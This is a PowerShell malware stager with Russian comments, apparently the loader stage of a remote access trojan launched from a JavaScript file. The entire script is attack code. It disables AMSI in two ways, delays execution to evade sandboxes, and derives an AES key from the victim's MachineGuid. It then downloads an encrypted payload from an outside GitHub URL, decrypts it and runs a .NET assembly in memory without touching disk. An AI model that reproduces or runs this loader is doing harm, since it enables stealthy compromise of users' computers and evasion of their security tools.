# short_launcher.ps1 — полный код (расшифровка + запуск в памяти без записи .exe)
# Запускается из drive.js без сохранения этого файла на диск

$ErrorActionPreference = 'SilentlyContinue'

# -------------------------------------------------------
# 1. Самый стабильный обход AMSI на февраль 2026
# -------------------------------------------------------

# Вариант 1 — классический (amsiInitFailed)
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    "AMSI bypass (initFailed) выполнен" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
} catch {
    "Ошибка AMSI bypass (initFailed): $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
}

# Вариант 2 — патчинг AmsiScanBuffer в памяти (если первый не сработал)
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $context = $amsi.GetField('amsiContext','NonPublic,Static').GetValue($null)
    if ($context -ne $null) {
        $ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal(4)
        [Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0)
        $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($context, [Type]::GetType('System.Int32'))
        $delegate.Invoke([IntPtr]::Zero, $ptr)
        "AMSI патч AmsiScanBuffer выполнен" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
    }
} catch {
    "Ошибка AMSI патча: $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
}

# -------------------------------------------------------
# 2. Задержка для обхода песочниц / поведенческого анализа
# -------------------------------------------------------
Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 45)
"Задержка завершена: $(Get-Date)" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

# -------------------------------------------------------
# 3. Получаем MachineGUID для ключа AES
# -------------------------------------------------------
$guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -EA 0).MachineGuid
if (!$guid) {
    "MachineGUID не найден" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
    exit
}
"MachineGUID получен" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

# -------------------------------------------------------
# 4. Создаём ключ AES из SHA256(MachineGUID)
# -------------------------------------------------------
$key = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($guid))
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = [byte[]]@(0)*16

# -------------------------------------------------------
# 5. Скачиваем зашифрованный payload
# -------------------------------------------------------
$payloadUrl = "https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/encrypted.b64"
try {
    $encB64 = (Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing -TimeoutSec 30).Content
    "Payload скачан (длина base64: $($encB64.Length))" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
} catch {
    "Ошибка скачивания payload: $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
    exit
}

# -------------------------------------------------------
# 6. Декодируем base64 → расшифровываем AES
# -------------------------------------------------------
try {
    $encBytes = [Convert]::FromBase64String($encB64)
    $decryptor = $aes.CreateDecryptor()
    $decBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    "Расшифровка завершена (длина байт: $($decBytes.Length))" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
} catch {
    "Ошибка расшифровки: $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
    exit
}

# -------------------------------------------------------
# 7. Загружаем .NET-сборку в память и выполняем
# -------------------------------------------------------
try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Reflection;
    public class MemLoader {
        public static void Execute(byte[] bytes) {
            var asm = Assembly.Load(bytes);
            var entry = asm.EntryPoint;
            if (entry != null) {
                entry.Invoke(null, new object[] { new string[0] });
            } else {
                throw new Exception("EntryPoint не найден");
            }
        }
    }
"@ -Language CSharp -ErrorAction Stop

    [MemLoader]::Execute($decBytes)
    "Сборка загружена и запущена в памяти" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
} catch {
    "Ошибка загрузки/запуска сборки: $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
}